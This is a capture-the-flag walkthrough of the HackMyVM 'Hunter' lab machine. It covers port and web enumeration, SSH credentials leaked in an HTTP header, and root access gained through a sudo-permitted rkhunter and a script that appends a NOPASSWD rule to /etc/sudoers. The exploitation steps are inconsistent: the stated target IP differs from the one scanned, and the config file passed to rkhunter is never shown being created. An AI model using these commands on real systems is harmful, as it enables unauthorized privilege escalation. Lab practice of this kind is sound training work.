# Hunter

## Executive Summary

| Item | Content |
| :--- | :--- |
| **Platform** | [HackMyVM](https://hackmyvm.eu/) |
| **Machine** | [Hunter](https://hackmyvm.eu/machines/machine.php?vm=Hunter) |
| **Author** | [sml](https://hackmyvm.eu/profile/?user=sml) |
| **Difficulty** | Beginner |

## PenetrationTest

### 1. Enumeration

#### 1-1. Host Scan

The target IP address is 192.168.56.103.

```bash
┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Hunter]
└─$ fping -aqg 192.168.56.102/24
192.168.56.100
192.168.56.102
192.168.56.106
```

#### 1-2. Port Scan

The target open ports is 22 (ssh) and 8080 (http).

```bash
┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Hunter]
└─$ nmap -A -sS -p- -v -T 4 --script=default,vuln 192.168.56.106 -oN nmap.log
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-25 02:10 -0400
NSE: Loaded 259 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 02:10
Completed NSE at 02:10, 10.02s elapsed
Initiating NSE at 02:10
Completed NSE at 02:10, 0.00s elapsed
Initiating NSE at 02:10
Completed NSE at 02:10, 0.00s elapsed
Initiating ARP Ping Scan at 02:10
Scanning 192.168.56.106 [1 port]
Completed ARP Ping Scan at 02:10, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 02:10
Completed Parallel DNS resolution of 1 host. at 02:10, 0.50s elapsed
Initiating SYN Stealth Scan at 02:10
Scanning 192.168.56.106 [65535 ports]
Discovered open port 8080/tcp on 192.168.56.106
Discovered open port 22/tcp on 192.168.56.106
Completed SYN Stealth Scan at 02:11, 30.66s elapsed (65535 total ports)
Initiating Service scan at 02:11
Scanning 2 services on 192.168.56.106
Completed Service scan at 02:11, 26.14s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 192.168.56.106
NSE: Script scanning 192.168.56.106.
Initiating NSE at 02:11
Completed NSE at 02:19, 510.98s elapsed
Initiating NSE at 02:19
Completed NSE at 02:19, 0.03s elapsed
Initiating NSE at 02:19
Completed NSE at 02:19, 0.01s elapsed
Nmap scan report for 192.168.56.106
Host is up (0.0016s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0 (protocol 2.0)
| vulners:
|   cpe:/a:openbsd:openssh:10.0:
|     	CVE-2026-35414	8.1	https://vulners.com/cve/CVE-2026-35414
|     	CVE-2026-35386	8.1	https://vulners.com/cve/CVE-2026-35386
|     	CVE-2026-35385	8.1	https://vulners.com/cve/CVE-2026-35385
|     	CVE-2026-35387	6.5	https://vulners.com/cve/CVE-2026-35387
|     	CVE-2025-61985	3.6	https://vulners.com/cve/CVE-2025-61985
|     	CVE-2025-61984	3.6	https://vulners.com/cve/CVE-2025-61984
|     	B7EACB4F-A5CF-5C5A-809F-E03CCE2AB150	3.6	https://vulners.com/githubexploit/B7EACB4F-A5CF-5C5A-809F-E03CCE2AB150	*EXPLOIT*
|     	4C6E2182-0E99-5626-83F6-1646DD648C57	3.6	https://vulners.com/githubexploit/4C6E2182-0E99-5626-83F6-1646DD648C57	*EXPLOIT*
|_    	CVE-2026-35388	2.5	https://vulners.com/cve/CVE-2026-35388
8080/tcp open  http    Golang net/http server
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-favicon: Unknown favicon MD5: D58DB6BFC5A697F0567773A18D530102
| http-phpmyadmin-dir-traversal:
|   VULNERABLE:
|   phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion
|     State: UNKNOWN (unable to test)
|     IDs:  CVE:CVE-2005-3299
|       PHP file inclusion vulnerability in grab_globals.lib.php in phpMyAdmin 2.6.4 and 2.6.4-pl1 allows remote attackers to include local files via the $__redirect parameter, possibly involving the subform array.
|
|     Disclosure date: 2005-10-nil
|     Extra information:
|       ../../../../../etc/passwd :
|   Yes, thats a CTF :_(
|
|     References:
|       http://www.exploit-db.com/exploits/1244/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3299
|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_/admin
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
|_http-open-proxy: Proxy might be redirecting requests
| fingerprint-strings:
|   FourOhFourRequest, GetRequest, HTTPOptions:
|     HTTP/1.0 200 OK
|     Date: Mon, 25 May 2026 06:11:05 GMT
|     Content-Length: 21
|     Content-Type: text/plain; charset=utf-8
|     Yes, thats a CTF :_(
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   OfficeScan:
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.99%I=7%D=5/25%Time=6A13E7FB%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,8A,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Mon,\x2025\x20May\x2020
SF:26\x2006:11:05\x20GMT\r\nContent-Length:\x2021\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\n\r\nYes,\x20thats\x20a\x20CTF\x20:_\(\n")%r
SF:(HTTPOptions,8A,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Mon,\x2025\x20May\x
SF:202026\x2006:11:05\x20GMT\r\nContent-Length:\x2021\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\n\r\nYes,\x20thats\x20a\x20CTF\x20:_\(\n
SF:")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
SF:0Bad\x20Request")%r(FourOhFourRequest,8A,"HTTP/1\.0\x20200\x20OK\r\nDat
SF:e:\x20Mon,\x2025\x20May\x202026\x2006:11:05\x20GMT\r\nContent-Length:\x
SF:2021\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nYes,\x20th
SF:ats\x20a\x20CTF\x20:_\(\n")%r(Socks5,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request")%r(GenericLines,67,"HTTP/1\.1\x204
SF:00\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r
SF:\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSess
SF:ionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20cl
SF:ose\r\n\r\n400\x20Bad\x20Request")%r(OfficeScan,A3,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request:\x20missing\x20required\x20Host\x20header\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request:\x20missing\x20required\x20Host\x20header");
MAC Address: 08:00:27:7F:E8:6C (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
Uptime guess: 27.082 days (since Tue Apr 28 00:21:43 2026)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   1.64 ms 192.168.56.106

NSE: Script Post-scanning.
Initiating NSE at 02:19
Completed NSE at 02:19, 0.00s elapsed
Initiating NSE at 02:19
Completed NSE at 02:19, 0.00s elapsed
Initiating NSE at 02:19
Completed NSE at 02:19, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 580.75 seconds
           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)
```

#### 1-3. WebContentDiscovery

Found index.html.

```bash
┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Hunter]
└─$ gobuster dir --url http://192.168.56.106:8080 -w /usr/share/wordlists/dirb/common.txt -o gobuster.log
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.106:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 0 / 1 (0.00%)
2026/05/25 03:00:02 the server returns a status code that matches the provided options for non existing urls. http://192.168.56.106:8080/ef7876a2-512b-4bc6-baa0-03067560f456 => 200 (Length: 21). Please exclude the response length or the status code or set the wildcard option.. To continue please exclude the status code or the length

┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Hunter]
└─$ gobuster dir --url http://192.168.56.106:8080 -w /usr/share/wordlists/dirb/common.txt -o gobuster.log --exclude-length 21
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.106:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          21
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
admin                (Status: 200) [Size: 13]
robots.txt           (Status: 200) [Size: 31]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

#### 1-4. top

The content is simple.

```bash
┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Hunter]
└─$ curl http://192.168.56.106:8080 -v
*   Trying 192.168.56.106:8080...
* Established connection to 192.168.56.106 (192.168.56.106 port 8080) from 192.168.56.102 port 33396
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 192.168.56.106:8080
> User-Agent: curl/8.19.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Mon, 25 May 2026 07:02:29 GMT
< Content-Length: 21
< Content-Type: text/plain; charset=utf-8
<
Yes, thats a CTF :_(
* Connection #0 to host 192.168.56.106:8080 left intact
```

#### 1-5. admin

When accessed via POST, X-Secret-Creds is present.

```bash
┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Hunter]
└─$ curl http://192.168.56.106:8080/admin -v
*   Trying 192.168.56.106:8080...
* Established connection to 192.168.56.106 (192.168.56.106 port 8080) from 192.168.56.102 port 47512
* using HTTP/1.x
> GET /admin HTTP/1.1
> Host: 192.168.56.106:8080
> User-Agent: curl/8.19.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Mon, 25 May 2026 07:04:17 GMT
< Content-Length: 13
< Content-Type: text/plain; charset=utf-8
<
Invalid JWT.
* Connection #0 to host 192.168.56.106:8080 left intact
┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Hunter]
└─$ curl -X POST http://192.168.56.106:8080/admin -v
*   Trying 192.168.56.106:8080...
* Established connection to 192.168.56.106 (192.168.56.106 port 8080) from 192.168.56.102 port 34512
* using HTTP/1.x
> POST /admin HTTP/1.1
> Host: 192.168.56.106:8080
> User-Agent: curl/8.19.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 200 OK
< X-Secret-Creds: hunterman:thisisnitriilcisi
< Date: Mon, 25 May 2026 07:14:56 GMT
< Content-Length: 13
< Content-Type: text/plain; charset=utf-8
<
Invalid JWT.
* Connection #0 to host 192.168.56.106:8080 left intact
```

#### 1-6. robots.txt

Nothing in particular.

```bash
┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Hunter]
└─$ curl http://192.168.56.106:8080/robots.txt -v
*   Trying 192.168.56.106:8080...
* Established connection to 192.168.56.106 (192.168.56.106 port 8080) from 192.168.56.102 port 45752
* using HTTP/1.x
> GET /robots.txt HTTP/1.1
> Host: 192.168.56.106:8080
> User-Agent: curl/8.19.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 200 OK
< Content-Type: text/plain; charset=utf-8
< Date: Mon, 25 May 2026 07:05:03 GMT
< Content-Length: 31
<
User-agent: *
Disallow: /admin
* Connection #0 to host 192.168.56.106:8080 left intact
```

### 2. Exploitation

#### 2-1. Access

Found user.txt

```bash
┌──(kali㉿kali)-[~/Work/VulnerableMachineWriteups/HackMyVM/Hunter]
└─$ ssh hunterman@192.168.56.106
The authenticity of host '192.168.56.106 (192.168.56.106)' can't be established.
ED25519 key fingerprint is: SHA256:jt60cn6NFWsntzAw3UWEiADbNwlaTaBzCCwz5mqAh4M
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.106' (ED25519) to the list of known hosts.
hunterman@192.168.56.106's password:
Permission denied, please try again.
hunterman@192.168.56.106's password:
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

hunter:~$ id
uid=1000(hunterman) gid=1000(hunterman) groups=1000(hunterman)
hunter:~$ ls
user.txt
hunter:~$ cat user.txt
HMV{VcvaIKcezQVcvaIKcezQ}
```

#### 2-2. PrivilegeEscalation

Found root.txt

```bash
hunter:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

For security reasons, the password you type will not be visible.

[sudo] password for hunterman:
Sorry, user hunterman may not run sudo on hunter.
hunter:~$ find / -perm -4000 -type f 2>/dev/null
/bin/bbsuid
/usr/bin/sudo
hunter:~$ find / -perm -2000 -type f 2>/dev/null
hunter:~$ cat /etc/crontab
cat: can't open '/etc/crontab': No such file or directory
hunter:~$ ls /etc/crontabs/
root
hunter:~$ cat /etc/crontabs/root
cat: can't open '/etc/crontabs/root': Permission denied
hunter:~$ cat /bin/bbsuid
cat: can't open '/bin/bbsuid': Permission denied
hunter:~$ ls -la /bin/bbsuid
---s--x--x    1 root     root         14224 Aug  5  2025 /bin/bbsuid
hunter:~$ /bin/bbsuid
bbsuid: Use --install to install symlinks
hunter:~$ /bin/bbsuid --install
bbsuid: Only root can install symlinks
hunter:~$ ls /home
huntergirl  hunterman
hunter:~$ cd /home/huntergirl
hunter:/home/huntergirl$ ls
hunter:/home/huntergirl$ cat /etc/passwd
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
klogd:x:100:101:klogd:/dev/null:/sbin/nologin
hunterman:x:1000:1000::/home/hunterman:/bin/sh
huntergirl:x:1001:1001::/home/huntergirl:/bin/sh
hunter:/home/huntergirl$ find / -user huntergirl -type f 2>/dev/null
hunter:/home/huntergirl$ ps aux | grep huntergirl
 2403 hunterma  0:00 grep huntergirl
hunter:/home/huntergirl$ cd /var/www/
hunter:/var/www$ ls
html
hunter:/var/www$ cd html/
hunter:/var/www/html$ ls
admin       beacon      index       robots.txt
hunter:/var/www/html$ cd admin/
hunter:/var/www/html/admin$ ls
hunter:/var/www/html/admin$ cd ../beacon/
hunter:/var/www/html/beacon$ ls
hunter:/var/www/html/beacon$ cd ../
hunter:/var/www/html$ cat index
Yes, thats a CTF :_(
hunter:/var/www/html$ cat robots.txt
h u n t e r g i r l:fickshitmichini
hunter:/var/www/html$ su - huntergirl
Password:
hunter:~$ id
uid=1001(huntergirl) gid=1001(huntergirl) groups=1001(huntergirl)
hunter:~$ sudo -l
Matching Defaults entries for huntergirl on hunter:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for huntergirl:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User huntergirl may run the following commands on hunter:
    (root) NOPASSWD: /usr/local/bin/rkhunter
hunter:~$ sudo /usr/local/bin/rkhunter

Usage: rkhunter {--check | --unlock | --update | --versioncheck |
                 --propupd [{filename | directory | package name},...] |
                 --list [{tests | {lang | languages} | rootkits | perl | propfiles}] |
                 --config-check | --version | --help} [options]

Current options are:
         --append-log                  Append to the logfile, do not overwrite
         --bindir <directory>...       Use the specified command directories
     -c, --check                       Check the local system
     -C, --config-check                Check the configuration file(s), then exit
  --cs2, --color-set2                  Use the second color set for output
         --configfile <file>           Use the specified configuration file
         --cronjob                     Run as a cron job
                                       (implies -c, --sk and --nocolors options)
         --dbdir <directory>           Use the specified database directory
         --debug                       Debug mode
                                       (Do not use unless asked to do so)
         --disable <test>[,<test>...]  Disable specific tests
                                       (Default is to disable no tests)
         --display-logfile             Display the logfile at the end
         --enable  <test>[,<test>...]  Enable specific tests
                                       (Default is to enable all tests)
         --hash {MD5 | SHA1 | SHA224 | SHA256 | SHA384 | SHA512 |
                 NONE | <command>}     Use the specified file hash function
                                       (Default is SHA256)
     -h, --help                        Display this help menu, then exit
 --lang, --language <language>         Specify the language to use
                                       (Default is English)
         --list [tests | languages |   List the available test names, languages,
                 rootkits | perl |     rootkit names, perl module status
                 propfiles]            or file properties database, then exit
     -l, --logfile [file]              Write to a logfile
                                       (Default is /var/log/rkhunter.log)
         --noappend-log                Do not append to the logfile, overwrite it
         --nocf                        Do not use the configuration file entries
                                       for disabled tests (only valid with --disable)
         --nocolors                    Use black and white output
         --nolog                       Do not write to a logfile
--nomow, --no-mail-on-warning          Do not send a message if warnings occur
   --ns, --nosummary                   Do not show the summary of check results
 --novl, --no-verbose-logging          No verbose logging
         --pkgmgr {RPM | DPKG | BSD |  Use the specified package manager to obtain
                   BSDng | SOLARIS |   or verify file property values.
                   NONE}               (Default is NONE)
         --propupd [file | directory | Update the entire file properties database,
                    package]...        or just for the specified entries
     -q, --quiet                       Quiet mode (no output at all)
  --rwo, --report-warnings-only        Show only warning messages
   --sk, --skip-keypress               Don't wait for a keypress after each test
         --summary                     Show the summary of system check results
                                       (This is the default)
         --syslog [facility.priority]  Log the check start and finish times to syslog
                                       (Default level is authpriv.notice)
         --tmpdir <directory>          Use the specified temporary directory
         --unlock                      Unlock (remove) the lock file
         --update                      Check for updates to database files
   --vl, --verbose-logging             Use verbose logging (on by default)
     -V, --version                     Display the version number, then exit
         --versioncheck                Check for latest version of program
     -x, --autox                       Automatically detect if X is in use
     -X, --no-autox                    Do not automatically detect if X is in use
hunter:~$ cd /tmp/
hunter:/tmp$ cat > /tmp/rs.sh << 'EOF'
> #!/bin/sh
> echo 'huntergirl ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
> EOF
hunter:/tmp$ sudo /usr/local/bin/rkhunter --configfile /tmp/evil.conf --propupd
sudo /bin/sh
[ Rootkit Hunter version 1.4.6 ]
File updated: searched for 174 files, found 135, missing hashes 135
hunter:/tmp$ sudo /bin/sh
/tmp # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/tmp # cd /root
~ # ls
prog      root.txt
~ # cat root.txt
HMV{FhOpuXDUlZFhOpuXDUlZ}
```

### 3. Conclusion & Loot

I successfully captured flags.

- **User Flag:** HMV{VcvaIKcezQVcvaIKcezQ}
- **Root Flag:** HMV{FhOpuXDUlZFhOpuXDUlZ}

